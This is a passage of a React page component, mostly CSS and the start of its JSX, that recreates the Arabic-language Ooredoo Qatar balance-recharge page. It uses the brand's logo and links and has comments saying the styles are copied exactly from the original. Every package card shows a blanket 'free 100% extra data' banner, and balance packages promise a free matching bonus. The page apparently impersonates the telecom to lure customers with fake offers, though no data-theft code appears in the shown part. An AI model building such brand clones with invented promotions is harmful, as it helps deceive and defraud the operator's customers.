        /* ===== MOBILE NAV ===== */
        .rp-mobile-nav {
          display: none;
          align-items: center;
          justify-content: flex-start;
          padding: 0 12px;
          height: 44px;
          background: #fff;
          border-bottom: 1px solid #eee;
          gap: 0;
        }
        .rp-mobile-nav__btn {
          display: flex;
          align-items: center;
          gap: 6px;
          padding: 10px 16px;
          font-size: 13px;
          font-weight: 500;
          color: #221e20;
          text-decoration: none;
          border-radius: 20px;
          white-space: nowrap;
          transition: all 0.2s;
        }
        .rp-mobile-nav__btn.active {
          background: #ed1c24;
          color: #fff;
        }
        .rp-mobile-nav__btn.active svg {
          stroke: #fff;
        }
        .rp-mobile-nav__btn:not(.active):hover {
          background: #f5f5f5;
        }
        /* ===== BREADCRUMB ===== */
        .rp-breadcrumb {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 10px 64px;
          font-size: 13px;
          color: #666;
          background: #fff;
        }
        .rp-breadcrumb a { color: #666; text-decoration: none; }

        /* ===== HERO BANNER ===== */
        .rp-hero {
          background: #fff;
          padding: 20px 64px;
          display: flex;
          align-items: center;
          justify-content: space-between;
        }
        .rp-hero__text h1 {
          font-size: 22px;
          font-weight: 800;
          color: #221e20;
          margin-bottom: 6px;
        }
        .rp-hero__text p {
          font-size: 14px;
          color: #666;
          line-height: 1.6;
        }

        /* ===== MAIN LAYOUT ===== */
        .rp-layout {
          display: grid;
          grid-template-columns: 200px 1fr 200px;
          gap: 0;
          padding: 0 64px;
          align-items: start;
        }

        /* LEFT SIDEBAR - Filter */
        .rp-filter-sidebar {
          padding: 24px 16px 24px 0;
        }
        .rp-filter-toggle {
          display: flex;
          align-items: center;
          gap: 8px;
          background: #fff;
          border: 1px solid #e0e0e0;
          border-radius: 24px;
          padding: 10px 16px;
          font-size: 13px;
          font-weight: 600;
          color: #221e20;
          cursor: pointer;
          width: 100%;
          justify-content: center;
          font-family: 'Noto Kufi Arabic', sans-serif;
        }
        .rp-filter-toggle svg { width: 16px; height: 16px; }

        /* MIDDLE CONTENT */
        .rp-content {
          padding: 0 24px;
          padding-bottom: 0;
        }

        /* Step 1 */
        .rp-step1 {
          background: #f8f8f8;
          border-radius: 12px;
          padding: 24px;
          margin-bottom: 24px;
        }
        .rp-step__title {
          font-size: 18px;
          font-weight: 700;
          color: #221e20;
          margin-bottom: 6px;
        }
        .rp-step__desc {
          font-size: 14px;
          color: #555;
          margin-bottom: 14px;
          font-weight: 400;
        }

        /* Input */
        .rp-input {
          width: 100%;
          padding: 14px 16px;
          border: 1px solid #ddd;
          border-radius: 8px;
          font-size: 15px;
          font-family: 'Noto Kufi Arabic', sans-serif;
          outline: none;
          direction: rtl;
          background: #fff;
          color: #221e20;
        }
        .rp-input:focus { border-color: #999; }
        .rp-input::placeholder { color: #bbb; }
        .rp-input--locked { background: #f5f5f5; border-color: #ddd; font-weight: bold; font-size: 16px; }

        /* Step 2 */
        .rp-step2-header {
          display: flex;
          align-items: center;
          justify-content: space-between;
          margin-bottom: 6px;
        }

        /* Search */
        .rp-search {
          position: relative;
          margin-bottom: 16px;
        }
        .rp-search input {
          width: 100%;
          padding: 14px 48px 14px 16px;
          border: 1px solid #ddd;
          border-radius: 8px;
          font-size: 15px;
          font-family: 'Noto Kufi Arabic', sans-serif;
          outline: none;
          direction: rtl;
          background: #fff;
        }
        .rp-search input:focus { border-color: #999; }
        .rp-search input::placeholder { color: #999; font-weight: 400; }
        .rp-search__icon {
          position: absolute;
          right: 16px;
          top: 50%;
          transform: translateY(-50%);
          width: 20px;
          height: 20px;
          color: #ed1c24;
        }

        /* Category Tabs - EXACT from original CSS */
        .rp-tabs {
          display: flex;
          flex-wrap: wrap;
          gap: 8px;
          margin-bottom: 20px;
        }
        .rp-tab {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 4px;
          border-radius: 12px;
          border: 1px solid #aaa;
          padding: 8px 12px;
          color: #221e20;
          font-size: 16px;
          font-weight: 500;
          cursor: pointer;
          font-family: 'Noto Kufi Arabic', sans-serif;
          transition: all 0.15s;
          background: #fff;
          position: relative;
        }
        .rp-tab:hover { border-color: #ed1c24; color: #ed1c24; }
        .rp-tab.active {
          background: linear-gradient(88deg, #ef5c61, #b41118 41.73%, #ba161c 90.77%);
          color: #fff;
          border: none;
          font-size: 16px;
          font-weight: 500;
        }

        /* ===== PACKAGE CARDS - EXACT from image ===== */
        .rp-cards {
          display: flex;
          flex-direction: column;
          gap: 12px;
        }
        .rp-card-wrapper {
          position: relative;
        }
        .rp-card {
          background-color: #fff;
          border-radius: 8px;
          padding: 16px;
          display: flex;
          flex-direction: column;
          gap: 12px;
          width: 100%;
          position: relative;
          cursor: pointer;
          z-index: 2;
          border: none;
          box-shadow: 0px 2px 8px 0px rgba(0,0,0,0.2);
        }
        .rp-card:hover { background: #fafafa; }
        .rp-card--selected {
          border: 2px solid #003366 !important;
        }

        /* Card header */
        .rp-card__header {
          display: flex;
          flex-direction: row;
          gap: 8px;
          align-items: center;
          justify-content: flex-start;
        }
        .rp-card__name {
          font-size: 20px;
          font-weight: 600;
          color: #221e20;
        }

        /* Bonus tag - EXACT gradient from original */
        .rp-card__bonus-tag {
          position: absolute;
          top: 16px;
          left: 0;
        }
        .rp-card__bonus-tag-inner {
          display: flex;
          flex-direction: row;
          gap: 4px;
          align-items: center;
          color: #fff;
          font-weight: 400;
          font-size: 0.875rem;
          border-radius: 0 8px 8px 0;
          padding: 4px 10px;
          background: linear-gradient(88deg, #ef5c61, #b41118 41.73%, #ba161c 90.77%);
        }
        .rp-card__bonus-tag-inner svg {
          width: 16px;
          height: 16px;
        }

        /* Offer Banner - 100% extra */
        .rp-card__offer-banner {
          background: linear-gradient(135deg, #ff6b35, #ed1c24);
          color: #fff;
          text-align: center;
          padding: 8px 12px;
          margin: -20px -20px 12px -20px;
          border-radius: 12px 12px 0 0;
          font-weight: 700;
          font-size: 0.85rem;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 6px;
        }
        .rp-card__offer-banner svg {
          width: 18px;
          height: 18px;
        }
        .rp-card__offer-banner-text {
          display: flex;
          align-items: center;
          gap: 4px;
        }
        .rp-card__offer-double {
          background: rgba(255,255,255,0.2);
          border-radius: 4px;
          padding: 2px 8px;
          font-size: 0.75rem;
          margin-right: 6px;
        }
        .rp-card__bonus-extra {
          color: #ed1c24;
          font-weight: 700;
          font-size: 0.8rem;
          display: block;
          margin-top: 2px;
        }

        /* Card benefit rows */
        .rp-card__benefit {
          display: flex;
          flex-direction: row;
          gap: 8px;
          align-items: flex-start;
          justify-content: normal;
        }
        .rp-card__benefit-icon {
          width: 24px;
          height: 24px;
          flex-shrink: 0;
          margin-top: 2px;
        }
        .rp-social-icon {
          width: 32px;
          height: 32px;
          border-radius: 8px;
          display: flex;
          align-items: center;
          justify-content: center;
          flex-shrink: 0;
          margin-top: 0px;
        }
        .rp-social-icon svg {
          width: 28px;
          height: 28px;
        }
        .rp-card__benefit-details {
          display: flex;
          flex-direction: column;
          gap: 4px;
        }
        .rp-card__benefit-value {
          display: flex;
          gap: 4px;
          align-items: baseline;
        }
        .rp-card__benefit-value .bold {
          font-weight: 600;
          font-size: 16px;
          color: #221e20;
        }
        .rp-card__benefit-value .normal {
          font-weight: 400;
          font-size: 14px;
          color: #221e20;
        }
        .rp-card__show-all {
          color: #ed1c24;
          font-size: 13px;
          font-weight: 600;
          cursor: pointer;
          text-decoration: underline;
          margin-inline-start: 8px;
        }

        /* Sublabels (extras) - EXACT from original */
        .rp-card__sublabel {
          color: #0047bb;
          background-color: #ebedf9;
          border-radius: 6px;
          padding: 4px 8px;
          font-size: 14px;
          font-weight: 400;
          display: inline-block;
          margin-inline-end: 4px;
          margin-bottom: 4px;
          border: none;
        }

        /* Card footer */
        .rp-card__footer {
          display: flex;
          flex-direction: row;
          align-items: flex-end;
          width: 100%;
          justify-content: space-between;
          margin-top: 0;
          padding-top: 0;
        }

        /* Validity badge - EXACT from original */
        .rp-card__validity {
          background-color: #d8eeea;
          border-radius: 4px;
          padding: 4px 8px;
          display: flex;
          align-items: center;
          gap: 4px;
        }
        .rp-card__validity-text {
          color: #221e20;
          font-size: 16px;
          font-weight: 400;
        }
        .rp-card__validity svg {
          width: 16px;
          height: 16px;
          color: #221e20;
        }

        /* Price - EXACT from original */
        .rp-card__price-container {
          display: flex;
          flex-direction: row;
          align-items: flex-end;
          gap: 8px;
        }
        .rp-card__price {
          display: flex;
          align-items: center;
          direction: ltr;
          white-space: nowrap;
        }
        .rp-card__price-currency {
          font-size: 12px;
          font-weight: 600;
          color: #ed1c24;
          line-height: inherit;
        }
        .rp-card__price-amount {
          font-size: 18px;
          font-weight: 600;
          color: #ed1c24;
          line-height: 24px;
          margin-left: 2px;
        }
        .rp-card__divider {
          width: 1px;
          height: 32px;
          background-color: #c7c5c6;
          display: block;
        }
        .rp-card__price-arrow {
          width: 24px;
          height: 24px;
          color: #ed1c24;
          transform: rotate(180deg);
        }

        /* Show More */
        .rp-show-more {
          text-align: center;
          padding: 20px 0 0 0;
        }
        .rp-show-more button {
          background: #fff;
          border: 1px solid #ddd;
          border-radius: 22px;
          padding: 10px 32px;
          font-size: 14px;
          font-weight: 600;
          color: #221e20;
          cursor: pointer;
          font-family: 'Noto Kufi Arabic', sans-serif;
        }
        .rp-show-more button:hover { border-color: #ed1c24; color: #ed1c24; }

        /* RIGHT SIDEBAR */
        .rp-promo-sidebar {
          padding: 24px 0 24px 16px;
        }
        .rp-promo-sidebar__label {
          font-size: 12px;
          font-weight: 700;
          color: #999;
          margin-bottom: 16px;
        }
        .rp-promo-card {
          background: #f8f8f8;
          border: 1px solid #f0f0f0;
          border-radius: 12px;
          padding: 16px;
          margin-bottom: 12px;
          text-align: center;
        }
        .rp-promo-card__title {
          font-size: 12px;
          font-weight: 700;
          color: #221e20;
          margin-bottom: 4px;
        }
        .rp-promo-card__desc {
          font-size: 11px;
          color: #666;
        }
        .rp-promo-nav {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          margin-top: 12px;
        }
        .rp-promo-nav button {
          background: #fff;
          border: 1px solid #e0e0e0;
          border-radius: 50%;
          width: 28px;
          height: 28px;
          display: flex;
          align-items: center;
          justify-content: center;
          cursor: pointer;
          font-size: 14px;
          color: #666;
        }

        /* ===== MORE SECTION ===== */
        .rp-more-section {
          background: #fff;
          padding: 32px 64px;
          margin-top: 48px;
          border-top: none;
        }
        .rp-more-section h2 {
          font-size: 18px;
          font-weight: 700;
          color: #221e20;
          margin-bottom: 16px;
        }
        .rp-accordion-item {
          background: #fff;
          border: 1px solid #eee;
          border-radius: 8px;
          margin-bottom: 8px;
          padding: 14px 20px;
          cursor: pointer;
          font-size: 14px;
          font-weight: 600;
          color: #221e20;
          display: flex;
          align-items: center;
          justify-content: space-between;
        }
        .rp-accordion-item:hover { border-color: #ccc; }
        .rp-accordion-item svg { width: 18px; height: 18px; color: #666; }

        /* ===== FOOTER ===== */
        .rp-footer {
          background: #2d2d2d;
          color: #fff;
          padding: 40px 64px;
        }
        .rp-footer__top {
          display: grid;
          grid-template-columns: repeat(4, 1fr);
          gap: 32px;
          margin-bottom: 32px;
        }
        .rp-footer__col h4 {
          font-size: 14px;
          font-weight: 700;
          color: #fff;
          margin-bottom: 12px;
        }
        .rp-footer__col ul { list-style: none; padding: 0; }
        .rp-footer__col ul li { margin-bottom: 8px; }
        .rp-footer__col ul li a { color: #aaa; text-decoration: none; font-size: 13px; }
        .rp-footer__col ul li a:hover { color: #fff; }
        .rp-footer__bottom {
          border-top: 1px solid #555;
          padding-top: 20px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          flex-wrap: wrap;
          gap: 16px;
        }
        .rp-footer__bottom-links {
          display: flex;
          align-items: center;
          gap: 16px;
          flex-wrap: wrap;
        }
        .rp-footer__bottom-links a { color: #fff; text-decoration: none; font-size: 13px; font-weight: 600; }
        .rp-footer__bottom-links span { color: #666; }
        .rp-footer__copy { color: #888; font-size: 11px; }
        .rp-footer__social {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        .rp-footer__social span { color: #fff; font-size: 13px; }
        .rp-footer__social a { color: #fff; text-decoration: none; }
        .rp-footer__social svg { width: 18px; height: 18px; fill: #fff; }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 1024px) {
          .rp-layout { grid-template-columns: 1fr; }
          .rp-filter-sidebar, .rp-promo-sidebar { display: none; }
          .rp-content { padding: 0 16px; }
        }
        @media (max-width: 768px) {
          .rp-header { padding: 0 12px; height: 52px; }
          .rp-header__logo img { height: 28px; }
          .rp-header__links { display: none; }
          .rp-mobile-nav { display: flex; }
          .rp-mobile-nav { display: flex; }
          .rp-header__left { gap: 8px; }
          .rp-header__lang { font-size: 12px; }
          .rp-header__myoredoo { padding: 6px 14px; font-size: 11px; }
          .rp-subnav { padding: 0 12px; gap: 12px; height: 40px; }
          .rp-subnav a { font-size: 12px; }
          .rp-breadcrumb { padding: 8px 12px; font-size: 12px; }
          .rp-hero { padding: 16px 12px; flex-direction: column; gap: 8px; }
          .rp-hero__text h1 { font-size: 18px; }
          .rp-hero__text p { font-size: 13px; }
          .rp-layout { padding: 0 12px; }
          .rp-content { padding: 0; }
          .rp-step1 { padding: 16px; margin-bottom: 16px; border-radius: 10px; }
          .rp-step__title { font-size: 16px; }
          .rp-step__desc { font-size: 13px; margin-bottom: 10px; }
          .rp-input { padding: 12px 14px; font-size: 14px; }
          .rp-tabs { gap: 6px; margin-bottom: 14px; }
          .rp-tab { padding: 6px 10px; font-size: 13px; border-radius: 10px; }
          .rp-search input { padding: 12px 40px 12px 14px; font-size: 14px; }
          .rp-card { padding: 14px; border-radius: 10px; gap: 10px; }
          .rp-card__name { font-size: 17px; }
          .rp-card__offer-banner { margin: -14px -14px 10px -14px; padding: 6px 10px; font-size: 0.75rem; border-radius: 10px 10px 0 0; }
          .rp-card__data-row { font-size: 14px; }
          .rp-card__price { font-size: 15px; }
          .rp-card__validity { font-size: 12px; }
          .rp-card__features { gap: 4px; }
          .rp-card__feature { font-size: 12px; padding: 3px 8px; }
          .rp-custom-recharge { padding: 12px 14px; border-radius: 10px; }
          .rp-custom-recharge__title { font-size: 14px; }
          .rp-custom-recharge__desc { font-size: 12px; }
          .rp-more-section { padding: 20px 12px; margin-top: 32px; }
          .rp-more-section h2 { font-size: 16px; }
          .rp-accordion-item { padding: 12px 14px; font-size: 13px; }
          .rp-footer { padding: 24px 12px; }
          .rp-footer__top { grid-template-columns: 1fr 1fr; gap: 20px; }
          .rp-footer__col h4 { font-size: 13px; }
          .rp-footer__col ul li a { font-size: 12px; }
          .rp-footer__bottom { flex-direction: column; align-items: flex-start; gap: 12px; }
          .rp-footer__bottom-links { flex-wrap: wrap; gap: 10px; }
          .rp-footer__bottom-links a { font-size: 11px; }
          .rp-bottom-bar { padding: 12px 14px; flex-direction: column; align-items: stretch; gap: 10px; }
          .rp-bottom-bar__pkg { font-size: 14px; }
          .rp-bottom-bar__price { font-size: 14px; }
          .rp-bottom-bar__btn { padding: 12px 24px; font-size: 14px; width: 100%; }
          .rp-bottom-bar__error { font-size: 12px; padding: 8px 12px; margin: 0; text-align: center; }
          .rp-bottom-bar > div:first-child { display: flex; justify-content: space-between; align-items: center; gap: 12px; }
          .rp-bottom-bar > div:last-child { width: 100%; }
          .rp-bottom-bar > div:last-child { display: flex !important; gap: 8px !important; }
          .rp-bottom-bar > div:last-child button.rp-bottom-bar__btn { flex: 1; }
        }
        @media (max-width: 400px) {
          .rp-header { padding: 0 8px; }
          .rp-header__myoredoo { padding: 5px 10px; font-size: 10px; }
          .rp-layout { padding: 0 8px; }
          .rp-step1 { padding: 12px; }
          .rp-tab { padding: 5px 8px; font-size: 12px; }
          .rp-card { padding: 12px; }
          .rp-card__name { font-size: 15px; }
          .rp-footer__top { grid-template-columns: 1fr; }
          .rp-bottom-bar { padding: 10px 10px; }
          .rp-bottom-bar__btn { padding: 10px 16px; font-size: 13px; }
        }
        /* Custom Recharge Button */
        .rp-custom-recharge {
          display: flex;
          align-items: center;
          justify-content: space-between;
          background: #f5f5f5;
          border: 1px solid #e0e0e0;
          border-radius: 12px;
          padding: 16px 20px;
          margin-bottom: 16px;
          cursor: pointer;
          transition: box-shadow 0.2s;
        }
        .rp-custom-recharge:hover {
          box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }
        .rp-custom-recharge__content {
          display: flex;
          align-items: center;
          gap: 12px;
          flex-direction: row-reverse;
        }
        .rp-custom-recharge__icon {
          width: 36px;
          height: 36px;
          flex-shrink: 0;
        }
        .rp-custom-recharge__text {
          display: flex;
          flex-direction: column;
          text-align: right;
        }
        .rp-custom-recharge__title {
          font-size: 16px;
          font-weight: 700;
          color: #333;
        }
        .rp-custom-recharge__desc {
          font-size: 13px;
          color: #888;
          margin-top: 2px;
        }
        .rp-custom-recharge__arrow {
          width: 20px;
          height: 20px;
          flex-shrink: 0;
        }

        /* Popup Overlay */
        .rp-popup-overlay {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0,0,0,0.5);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 9999;
        }
        .rp-popup {
          background: #fff;
          border-radius: 16px;
          width: 90%;
          max-width: 500px;
          padding: 24px;
          position: relative;
          animation: rp-popup-fade-in 0.3s ease;
        }
        @keyframes rp-popup-fade-in {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .rp-popup__close {
          position: absolute;
          top: 16px;
          left: 16px;
          background: none;
          border: none;
          cursor: pointer;
          padding: 4px;
        }
        .rp-popup__close svg {
          width: 24px;
          height: 24px;
        }
        .rp-popup__header {
          text-align: right;
          margin-bottom: 20px;
        }
        .rp-popup__header h3 {
          font-size: 20px;
          font-weight: 700;
          color: #333;
          margin: 0 0 8px;
        }
        .rp-popup__header p {
          font-size: 14px;
          color: #666;
          margin: 0;
        }
        .rp-popup__body {
          margin-bottom: 16px;
        }
        .rp-popup__input {
          width: 100%;
          padding: 14px 16px;
          border: 1px solid #ddd;
          border-radius: 8px;
          font-size: 16px;
          text-align: right;
          direction: rtl;
          outline: none;
          box-sizing: border-box;
        }
        .rp-popup__input:focus {
          border-color: #ed1c24;
        }
        .rp-popup__input::placeholder {
          color: #bbb;
        }
        .rp-popup__submit {
          width: 100%;
          padding: 14px;
          background: #999;
          color: #fff;
          border: none;
          border-radius: 30px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          transition: background 0.2s;
        }
        .rp-popup__submit:hover {
          background: #777;
        }

        /* Bottom Bar - Sticky */
        .rp-bottom-bar {
          position: fixed;
          bottom: 0;
          left: 0;
          right: 0;
          background: #fff;
          border-top: 1px solid #e0e0e0;
          padding: 12px 24px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          z-index: 1000;
          box-shadow: 0 -2px 12px rgba(0,0,0,0.08);
          direction: rtl;
        }
        .rp-bottom-bar__pkg {
          font-size: 15px;
          font-weight: 700;
          color: #221e20;
        }
        .rp-bottom-bar__price {
          font-size: 14px;
          color: #ed1c24;
          font-weight: 600;
        }
        .rp-bottom-bar__error {
          background: #fff8e1;
          border: 1px solid #ffc107;
          border-radius: 8px;
          padding: 8px 14px;
          font-size: 13px;
          color: #7a5c00;
          flex: 1;
          margin: 0 12px;
          text-align: right;
        }
        .rp-bottom-bar__btn {
          background: #ed1c24;
          color: #fff;
          border: none;
          border-radius: 24px;
          padding: 12px 32px;
          font-size: 15px;
          font-weight: 700;
          cursor: pointer;
          font-family: 'Noto Kufi Arabic', sans-serif;
          white-space: nowrap;
        }
        .rp-bottom-bar__btn:disabled {
          background: #ccc;
          cursor: not-allowed;
        }
        .rp-bottom-bar__close {
          background: none;
          border: none;
          cursor: pointer;
          color: #999;
          font-size: 20px;
          padding: 4px 8px;
        }
      `}</style>

      <div className="rp-page">
        {/* TOP HEADER */}
        <header className="rp-header">
          <div className="rp-header__right">
            <div className="rp-header__logo">
              <a href="/"><img src="/ooredoo/ooredoo-logo.svg" alt="ooredoo" /></a>
            </div>
            <div className="rp-header__links">
              <a href="https://www.ooredoo.qa/web/ar/">الشخصية</a>
              <a href="/recharge" className="active" style={{display:'flex',alignItems:'center',gap:'4px'}}><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#ed1c24" strokeWidth="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12" y2="18.01"/></svg>تعبئة الرصيد</a>
              <a href="/pay-for-others" style={{display:'flex',alignItems:'center',gap:'4px'}}><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#ed1c24" strokeWidth="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 10h20"/></svg>دفع الفواتير</a>
            </div>
          </div>
          <div className="rp-header__left">
            <button className="rp-header__lang">English</button>
            <button className="rp-header__myoredoo">MY OOREDOO</button>
          </div>
        </header>
        {/* MOBILE NAV BAR - visible only on mobile */}
        <div className="rp-mobile-nav">
          <a href="/recharge" className="rp-mobile-nav__btn active">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12" y2="18.01"/></svg>
            تعبئة الرصيد
          </a>
          <a href="/pay-for-others" className="rp-mobile-nav__btn">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 10h20"/></svg>
            دفع الفواتير
          </a>
        </div>



        {/* BREADCRUMB */}
        <div className="rp-breadcrumb">
          <a href="/">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/>
            </svg>
          </a>
          <span>‹</span>
          <span>تعبئة الرصيد</span>
        </div>

        {/* HERO */}
        <div className="rp-hero">
          <div className="rp-hero__text">
            <h1>جميع خيارات تعبئة الرصيد</h1>
            <p>اختر أحد خيارات التعبئة أدناه أو ابحث عن منتج معين في صندوق البحث.</p>
          </div>
        </div>

        {/* 3-COLUMN LAYOUT */}
        <div className="rp-layout">
          {/* LEFT SIDEBAR */}
          <div className="rp-filter-sidebar">
            <button className="rp-filter-toggle">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 20V10M18 20V4M6 20v-4"/></svg>
              تصفية حسب
              <svg viewBox="0 0 24 24" fill="none" stroke="#4caf50" strokeWidth="2.5"><path d="M5 13l4 4L19 7"/></svg>
            </button>
          </div>

          {/* MIDDLE CONTENT */}
          <div className="rp-content">
            {/* STEP 1 */}
            <div className="rp-step1">
              <h2 className="rp-step__title">1. اختر أو أدخل الرقم</h2>
              <p className="rp-step__desc">اختر أو أدخل الرقم للاطلاع على العروض.</p>
              {phoneLocked ? (
                <div
                  className="rp-input rp-input--locked"
                  onClick={() => setPhoneLocked(false)}
                  style={{ cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}
                >
                  <span>{phoneNumber}</span>
                  <span style={{ fontSize: '12px', color: '#999' }}>✎</span>
                </div>
              ) : (
                <input
                  className="rp-input"
                  type="tel"
                  placeholder="أدخل الرقم"
                  value={phoneNumber}
                  onChange={(e) => {
                    const val = e.target.value.replace(/[^0-9]/g, '').slice(0, 8);
                    setPhoneNumber(val);
                    if (val.length === 8) {
                      setPhoneLocked(true);
                    }
                  }}
                  maxLength={8}
                  autoFocus={phoneNumber.length > 0}
                />
              )}
            </div>

            {/* STEP 2 */}
            <div>
              <h2 className="rp-step__title">2. اختر نوع التعبئة</h2>
              <p className="rp-step__desc">اختر نوع التعبئة أو ابحث عما تفضله.</p>

              {/* Category Tabs */}
              <div className="rp-tabs">
                {categories.map((cat) => (
                  <button
                    key={cat}
                    className={`rp-tab ${activeCategory === cat ? "active" : ""}`}
                    onClick={() => { setActiveCategory(cat); setShowMore(false); }}
                  >
                    {cat}
                  </button>
                ))}
              </div>

              {/* Search */}
              <div className="rp-search">
                <svg className="rp-search__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/>
                </svg>
                <input placeholder="بحث حسب المنتج أو السعر" />
              </div>

              {/* Custom Recharge Button - only for رصيد */}
              {activeCategory === "رصيد" && (
                <div className="rp-custom-recharge" onClick={() => setShowCustomRecharge(true)}>
                  <div className="rp-custom-recharge__content">
                    <svg className="rp-custom-recharge__icon" viewBox="0 0 24 24" fill="none" stroke="#ed1c24" strokeWidth="1.5">
                      <circle cx="12" cy="12" r="10" strokeDasharray="4 2"/>
                      <path d="M12 8v8M8 12h8" strokeLinecap="round"/>
                    </svg>
                    <div className="rp-custom-recharge__text">
                      <span className="rp-custom-recharge__title">تخصيص تعبئة الرصيد</span>
                      <span className="rp-custom-recharge__desc">عبئ رصيدك بالمبلغ الذي تفضله</span>
                    </div>
                  </div>
                  <svg className="rp-custom-recharge__arrow" viewBox="0 0 24 24" fill="none" stroke="#ed1c24" strokeWidth="2">
                    <path d="M19 12H5M5 12l6-6M5 12l6 6"/>
                  </svg>
                </div>
              )}

              {/* Package Cards */}
              <div className="rp-cards">
                {(showMore ? packages : packages.slice(0, 4)).map((pkg, i) => (
                  <div key={i} className="rp-card-wrapper">
                    <div className={`rp-card${selectedPkg?.name === pkg.name && selectedPkg?.price === pkg.price ? ' rp-card--selected' : ''}`} onClick={() => handleSelectPackage(pkg)}>
                      {/* Offer Banner - 100% extra */}
                      <div className="rp-card__offer-banner">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                          <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
                        </svg>
                        <span className="rp-card__offer-banner-text">
                          عرض خاص: احصل على <span className="rp-card__offer-double">100%</span> بيانات إضافية مجاناً!
                        </span>
                      </div>
                      {/* Bonus Tag */}
                      {pkg.hasOffers && (
                        <div className="rp-card__bonus-tag">
                          <div className="rp-card__bonus-tag-inner">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                              <path d="M20 12v10H4V12M2 7h20v5H2zM12 22V7M12 7H7.5a2.5 2.5 0 110-5C11 2 12 7 12 7zM12 7h4.5a2.5 2.5 0 100-5C13 2 12 7 12 7z"/>
                            </svg>
                            عروض إضافية
                          </div>
                        </div>
                      )}

                      {/* Header */}
                      <div className="rp-card__header">
                        <span className="rp-card__name">{pkg.name}</span>
                        {pkg.isNew && <span style={{background:'#1a73e8',color:'#fff',fontSize:'11px',fontWeight:600,padding:'2px 8px',borderRadius:'4px',marginRight:'4px'}}>جديد</span>}
                      </div>
                      {/* Balance bonus for رصيد packages */}
                      {pkg.name && pkg.name.includes('رصيد') && (
                        <div className="rp-card__bonus-extra" style={{marginBottom:'8px'}}>+ {pkg.price} ر.ق رصيد إضافي مجاناً</div>
                      )}

                      {/* Data benefit */}
                      {pkg.data && <div className="rp-card__benefit">
                        {pkg.socialIcon ? (
                          <div className={`rp-social-icon rp-social-icon--${pkg.socialIcon}`}>
                            {pkg.socialIcon === 'tiktok' && (
                              <svg viewBox="0 0 24 24" width="28" height="28"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1v-3.5a6.37 6.37 0 00-.79-.05A6.34 6.34 0 003.15 15.2a6.34 6.34 0 006.34 6.34 6.34 6.34 0 006.34-6.34V8.73a8.19 8.19 0 004.76 1.52V6.8a4.84 4.84 0 01-1-.11z" fill="#000"/></svg>
                            )}
                            {pkg.socialIcon === 'facebook' && (
                              <svg viewBox="0 0 24 24" width="28" height="28"><circle cx="12" cy="12" r="11" fill="#1877F2"/><path d="M16.67 15.47l.53-3.47h-3.33V9.87c0-.95.46-1.87 1.95-1.87h1.51V5.08s-1.37-.23-2.68-.23c-2.74 0-4.53 1.66-4.53 4.66V12H7.11v3.47h3.01V24h3.71V15.47h2.84z" fill="#fff"/></svg>
                            )}
                            {pkg.socialIcon === 'instagram' && (
                              <svg viewBox="0 0 24 24" width="28" height="28"><defs><linearGradient id="ig" x1="0" y1="24" x2="24" y2="0" gradientUnits="userSpaceOnUse"><stop offset="0" stopColor="#feda75"/><stop offset=".25" stopColor="#fa7e1e"/><stop offset=".5" stopColor="#d62976"/><stop offset=".75" stopColor="#962fbf"/><stop offset="1" stopColor="#4f5bd5"/></linearGradient></defs><rect x="1" y="1" width="22" height="22" rx="6" fill="url(#ig)"/><rect x="4" y="4" width="16" height="16" rx="4" fill="none" stroke="#fff" strokeWidth="1.5"/><circle cx="12" cy="12" r="4" fill="none" stroke="#fff" strokeWidth="1.5"/><circle cx="17.5" cy="6.5" r="1.2" fill="#fff"/></svg>
                            )}
                            {pkg.socialIcon === 'snapchat' && (
